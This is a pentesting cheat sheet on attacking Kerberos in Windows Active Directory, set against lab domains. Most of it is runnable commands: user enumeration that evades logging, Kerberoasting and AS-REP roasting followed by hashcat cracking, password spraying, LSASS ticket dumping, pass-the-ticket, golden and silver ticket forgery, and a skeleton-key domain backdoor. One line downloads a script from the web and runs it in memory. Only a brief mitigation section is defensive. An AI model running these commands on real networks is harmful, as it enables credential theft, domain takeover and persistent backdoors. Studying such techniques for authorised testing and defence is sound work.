# Pentesting Kerberos

## What is Kerberos

* Kerberos is the default authentication service for Microsoft Windows domains.
* It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption.

## Basic Terms

* Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
* Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
* Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
* Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
* Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
* KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
* Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
* Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
* Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
* Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

## Kerberos Authentication Overview

*

    <figure><img src="https://i.imgur.com/VRr2B6w.png" alt=""><figcaption></figcaption></figure>

### Kerberos Tickets Overview

* The most common type of ticket is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket.
* The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks.

## Enumeration with Kerbrute

* Add the domain name to `/etc/hosts`
* Kerbrute uses Kerberos Pre-Authentication to enumerate — this is stealthier than other methods
* Does **not** trigger Windows event ID 4625 (account failed logon)
* Only generates event ID 4768 (Kerberos TGT requested)
* Grab wordlists from https://github.com/insidetrust/statistically-likely-usernames

### Abusing Pre-Authentication Overview

* By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams.
* When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

### Kerbrute Installation

* Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
* Rename kerbrute\_linux\_amd64 to kerbrute
* `chmod +x kerbrute` - make kerbrute executable

### Enumerating Users w/ Kerbrute

* Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

* This will brute force user accounts from a domain controller using a supplied wordlist
*

    <figure><img src="https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png" alt=""><figcaption></figcaption></figure>

#### Enumerate Users Metasploit

```
auxiliary/gather/kerberos_enumusers
```

## Kerberoasting

### Overview

* Kerberoasting is a lateral movement/privilege escalation technique targeting Service Principal Name (SPN) accounts
* Any domain user can request a Kerberos ticket for any service account in the same domain
* The TGS-REP ticket is encrypted with the service account's NTLM hash
* We can grab that ticket and crack the cleartext password offline with hashcat
* If the service has a registered SPN then it can be Kerberoastable — success depends on how strong the password is and the privileges of the cracked account
* Use BloodHound to find all Kerberoastable accounts and see if they're domain admins or have interesting connections

### Kerberoasting with GetUserSPNs.py (Linux)

```
# List SPN accounts
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request all TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request a single user's ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Save to output file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### Kerberoasting with Rubeus (Windows)

```
# View kerberoastable stats
.\Rubeus.exe kerberoast /stats

# Kerberoast all accounts with admincount=1
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Kerberoast specific user
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Force RC4 for AES-enabled accounts (does not work against Server 2019 DCs)
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```

### Kerberoasting with PowerView (Windows)

```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# Target specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Semi-Manual Method (Windows)

```
# Enumerate SPNs
setspn.exe -Q */*
```

```
# Request ticket using PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

```
# Extract with Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

### Kerberoasting with Invoke-Kerberoast (Windows)

```
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
```

```
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat |fl
```

### Cracking TGS Tickets

```
# RC4 (type 23) - hashcat mode 13100
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# AES-256 (type 18) - hashcat mode 19700 (much slower to crack)
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

* To show the cracked password after it finishes:

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --show
```

### Encryption Types

* RC4 (type 23) is the default and easiest to crack — hash starts with `$krb5tgs$23$*`
* AES-256 (type 18) is much harder to crack — hash starts with `$krb5tgs$18$*`
* Check supported encryption with PowerView:

```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

* Value `0` = RC4\_HMAC\_MD5 (default)
* Value `24` = AES 128/256 only
* Use the `/tgtdeleg` flag in Rubeus to force RC4 even for AES-enabled accounts (does **not** work on Server 2019 DCs)

### Targeted Kerberoasting (via ACL Abuse)

* If you have GenericAll/GenericWrite over a user, you can set a fake SPN on them then Kerberoast their account:

```
# Set a fake SPN
Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

* Kerberoast that user, then clean up by removing the SPN:

```
Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipalname -Verbose
```

### Kerberoasting Mitigation

* Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
* Set long, complex passwords on service accounts (25+ characters)
* Monitor event IDs 4769 (Kerberos service ticket requested) and 4770 (Kerberos service ticket renewed)
* Restrict RC4 usage where possible — enforce AES encryption

## AS-REP Roasting

* AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
* Unlike Kerberoasting these users do not have to be service accounts — the only requirement is that the user must have pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`).

### AS-REP Roasting Overview

* During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request.
* After validating the timestamp the KDC will then issue a TGT for the user.
* If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

### AS-REP Roasting with GetNPUsers.py (Linux)

```
# With a user list
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.161 -request -usersfile users.txt

# Single user (just press enter when it asks for a password)
GetNPUsers.py DOMAIN/svc-alfresco -dc-ip 10.10.10.161 -no-pass

# Loop through users
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 DOMAIN/${user} | grep -v Impacket; done
```

### AS-REP Roasting with Rubeus (Windows)

* This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

```
Rubeus.exe asreproast
```

### Cracking AS-REP Hashes

* Transfer the hash from the target machine to your attacker machine and put it into a txt file
* Insert `23$` after `$krb5asrep$` so that the first line will be `$krb5asrep$23$User.....`
* Crack with hashcat mode 18200:

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

## Rubeus TGT Harvesting

* This command tells Rubeus to harvest for TGTs every 30 seconds

```
Rubeus.exe harvest /interval:30
```

*

    <figure><img src="https://i.imgur.com/VCeyyn9.png" alt=""><figcaption></figcaption></figure>

### Brute-Forcing and Password-Spraying with Rubeus

* Rubeus can both brute force passwords as well as password spray user accounts
* Before password spraying with Rubeus, add the domain controller domain name to the windows host file:

```
echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

* This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

```
Rubeus.exe brute /password:Password1 /noticket
```

*

    <figure><img src="https://i.imgur.com/WN4zVo5.png" alt=""><figcaption></figcaption></figure>
* Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

## Pass the Ticket with Mimikatz

### Pass the Ticket Overview

* Pass the ticket works by dumping the TGT from the LSASS memory of the machine.
* The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided.
* You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes.
* When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.
* This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets
*

    <figure><img src="https://i.imgur.com/V6SOlll.png" alt=""><figcaption></figcaption></figure>

### Prepare Mimikatz & Dump Tickets

* You will need to run the command prompt as an administrator

```
mimikatz.exe
privilege::debug
```

* Ensure this outputs `[output '20' OK]`
* This will export all of the .kirbi tickets into the directory that you are currently in

```
sekurlsa::tickets /export
```

* When looking for which ticket to impersonate I would recommend looking for an administrator ticket

### Pass the Ticket with Mimikatz

* We can now perform a pass the ticket attack to gain domain admin privileges.
* Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

```
kerberos::ptt <ticket>
```

*

    <figure><img src="https://i.imgur.com/DwXmm8Z.png" alt=""><figcaption></figcaption></figure>
* Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

```
klist
```

## Golden and Silver Ticket Attacks with Mimikatz

* A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet.
* The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
* A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server.

### KRBTGT Overview

* A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients.
* If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want.
* A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

### Golden and Silver Ticket Attack Overview

* A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket.
* This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash

### Dump the krbtgt hash

*

    <figure><img src="https://i.imgur.com/VOEsU4O.png" alt=""><figcaption></figcaption></figure>

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

* Above will dump the hash as well as the security identifier needed to create a Golden Ticket.
* To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

### Create a Golden or Silver Ticket

```
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```

* Simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
*

    <figure><img src="https://i.imgur.com/rh06qDl.png" alt=""><figcaption></figcaption></figure>
* This will open a new elevated command prompt with the given ticket in mimikatz.

```
misc::cmd
```

* Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from.
* However if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket.
* However, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
* ![alt text](https://i.imgur.com/BSh4rXy.png)

## Kerberos Backdoors with Mimikatz (Skeleton Key)

* A Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.
* The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps.
* A skeleton key only works using Kerberos RC4 encryption.
* The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password -`"mimikatz"`

### Skeleton Key Overview

* The timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash.
* Once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

```
mimikatz.exe
privilege::debug
misc::skeleton
```

* ![alt text](https://i.imgur.com/wI802gw.png)

### Accessing the forest

* The default credentials will be: `mimikatz`
* The share will now be accessible without the need for the Administrators password

```
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

* Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

```
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

* The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

## Kerberos Double Hop Problem

* This occurs when we're using WinRM/PowerShell remoting across two or more hops
* Default Kerberos authentication only provides a ticket for the specific resource — our creds don't follow us to the next hop
* The user's password/NTLM hash is **not** cached in the WinRM session, so we can't authenticate further
* Workarounds:
  * Create a `PSCredential` object within the session and pass it explicitly
  * Register a new PSSession configuration with `Register-PSSessionConfiguration` that uses `RunAsCredential`
  * Use `CredSSP` (not recommended in production — delegates credentials to the remote server)

## Resources

* https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
* https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
* https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
* https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
* https://www.varonis.com/blog/kerberos-authentication-explained/
* https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
* https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
* https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
